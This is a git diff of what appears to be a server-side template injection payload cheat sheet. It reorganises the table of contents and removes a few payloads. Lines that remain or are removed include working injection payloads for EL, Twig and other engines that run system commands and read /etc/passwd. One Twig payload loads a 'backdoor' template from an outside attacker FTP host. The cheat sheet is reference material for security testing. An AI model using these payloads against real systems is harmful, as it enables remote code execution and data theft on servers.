@@ -4,74 +4,59 @@
 
 ## Summary
 
-- [Templates Injections](#templates-injections)
-  - [Summary](#summary)
-  - [Tools](#tools)
-  - [Methodology](#methodology)
-  - [ASP.NET Razor](#aspnet-razor)
-    - [ASP.NET Razor - Basic injection](#aspnet-razor---basic-injection)
-    - [ASP.NET Razor - Command execution](#aspnet-razor---command-execution)
-  - [Expression Language EL](#expression-language-el)
-    - [Expression Language EL - Basic injection](#expression-language-el---basic-injection)
-    - [Expression Language EL - One-Liner injections not including code execution](#expression-language-el---one-liner-injections-not-including-code-execution)
-    - [Expression Language EL - Code Execution](#expression-language-el---code-execution)
-  - [Freemarker](#freemarker)
-    - [Freemarker - Basic injection](#freemarker---basic-injection)
-    - [Freemarker - Read File](#freemarker---read-file)
-    - [Freemarker - Code execution](#freemarker---code-execution)
-    - [Freemarker - Sandbox bypass](#freemarker---sandbox-bypass)
-  - [Groovy](#groovy)
-    - [Groovy - Basic injection](#groovy---basic-injection)
-    - [Groovy - Read and create File](#groovy---read-and-create-file)
-    - [Groovy - HTTP request:](#groovy---http-request)
-    - [Groovy - Command Execution](#groovy---command-execution)
-    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
-  - [Handlebars](#handlebars)
-    - [Handlebars - Command Execution](#handlebars---command-execution)
-  - [Jade / Codepen](#jade--codepen)
-  - [Java](#java)
-    - [Java - Basic injection](#java---basic-injection)
-    - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
-    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
-  - [Jinja2](#jinja2)
-    - [Jinja2 - Basic injection](#jinja2---basic-injection)
-    - [Jinja2 - Template format](#jinja2---template-format)
-    - [Jinja2 - Debug Statement](#jinja2---debug-statement)
-    - [Jinja2 - Dump all used classes](#jinja2---dump-all-used-classes)
-    - [Jinja2 - Dump all config variables](#jinja2---dump-all-config-variables)
-    - [Jinja2 - Read remote file](#jinja2---read-remote-file)
-    - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
-    - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
-      - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
-      - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
-      - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
-      - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
-    - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
-  - [Jinjava](#jinjava)
-    - [Jinjava - Basic injection](#jinjava---basic-injection)
-    - [Jinjava - Command execution](#jinjava---command-execution)
-  - [Lessjs](#lessjs)
-    - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
-    - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
-    - [Plugins](#plugins)
-  - [Mako](#mako)
-    - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
-  - [Pebble](#pebble)
-    - [Pebble - Basic injection](#pebble---basic-injection)
-    - [Pebble - Code execution](#pebble---code-execution)
-  - [Ruby](#ruby)
-    - [Ruby - Basic injections](#ruby---basic-injections)
-    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
-    - [Ruby - List files and directories](#ruby---list-files-and-directories)
-    - [Ruby - Code execution](#ruby---code-execution)
-  - [Smarty](#smarty)
-  - [Twig](#twig)
-    - [Twig - Basic injection](#twig---basic-injection)
-    - [Twig - Template format](#twig---template-format)
-    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
-    - [Twig - Code execution](#twig---code-execution)
-  - [Velocity](#velocity)
-  - [References](#references)
+* [Tools](#tools)
+* [Methodology](#methodology)
+* [ASP.NET Razor](#aspnet-razor)
+  * [Basic injection](#aspnet-razor---basic-injection)
+  * [Command execution](#aspnet-razor---command-execution)
+* [Expression Language EL](#expression-language-el)
+  * [Basic injection](#expression-language-el---basic-injection)
+  * [Code execution](#expression-language-el---code-execution)
+* [Freemarker](#freemarker)
+  * [Basic injection](#freemarker---basic-injection)
+  * [Code execution](#freemarker---code-execution)
+* [Groovy](#groovy)
+  * [Basic injection](#groovy---basic-injection)
+  * [Read/Create file](#groovy---read-and-create-file)
+  * [HTTP Request](#groovy---http-request)
+  * [Command execution](#groovy---command-execution)
+  * [Sandbox bypass](#groovy---sandbox-bypass)
+* [Handlebars](#handlebars)
+* [Jade / Codepen](#jade--codepen)
+* [Java](#java)
+  * [Basic injection](#java---basic-injection)
+  * [Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
+  * [Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+* [Jinja2](#jinja2)
+  * [Basic injection](#jinja2---basic-injection)
+  * [Template format](#jinja2---template-format)
+  * [Debug Statement](#jinja2---debug-statement)
+  * [Dump all used classes](#jinja2---dump-all-used-classes)
+  * [Dump all config variables](#jinja2---dump-all-config-variables)
+  * [Read remote file](#jinja2---read-remote-file)
+  * [Write into remote file](#jinja2---write-into-remote-file)
+  * [Remote Code Execution](#jinja2---remote-code-execution)
+  * [Filter bypass](#jinja2---filter-bypass)
+* [Jinjava](#jinjava)
+  * [Basic injection](#jinjava---basic-injection)
+  * [Command execution](#jinjava---command-execution)
+* [Lessjs](#lessjs)
+* [Mako](#mako)
+* [Pebble](#pebble)
+  * [Basic injection](#pebble---basic-injection)
+  * [Code execution](#pebble---code-execution)
+* [Ruby](#ruby)
+  * [Basic injections](#ruby---basic-injections)
+  * [Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
+  * [List files and directories](#ruby---list-files-and-directories)
+* [Smarty](#smarty)
+* [Twig](#twig)
+  * [Basic injection](#twig---basic-injection)
+  * [Template format](#twig---template-format)
+  * [Arbitrary File Reading](#twig---arbitrary-file-reading)
+  * [Code execution](#twig---code-execution)
+* [Velocity](#velocity)
+* [References](#references)
 
 ## Tools
 
@@ -89,13 +74,6 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 ![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
 
 ---
-## Detection
-
-In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :
-
-```
-${{<%[%'"}}%\.
-```
 
 ## ASP.NET Razor
 
@@ -152,7 +130,7 @@ ${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".g
 #{session.getAttribute("rtc").setAccessible(true)}
 #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
 
-// Method using process builder
+// Method using processbuilder
 ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
 ${request.getAttribute("c").add("cmd.exe")}
 ${request.getAttribute("c").add("/k")}
@@ -311,7 +289,6 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 ## Java
 
 ### Java - Basic injection
-> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
 
 ```java
 ${7*7}
@@ -798,7 +775,6 @@ Execute code using SSTI for Slim engine.
 {{7*7}}
 {{7*'7'}} would result in 49
 {{dump(app)}}
-{{dump(_context)}}
 {{app.request.server.all|join(',')}}
 ```
 
@@ -820,7 +796,6 @@ $output = $twig > render (
 
 ```python
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
-{{include("wp-config.php")}}
 ```
 
 ### Twig - Code execution
@@ -830,17 +805,8 @@ $output = $twig > render (
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
-{{[0]|reduce('system','id')}}
-{{['id']|map('system')|join}}
-{{['id',1]|sort('system')|join}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
-```
-
-Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
-
-```python
-FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
 ```
 
 Example with an email passing FILTER_VALIDATE_EMAIL PHP.
@@ -892,4 +858,3 @@ $str.valueOf($chr.toChars($out.read()))
 * [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
 * [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 * [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
-* [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
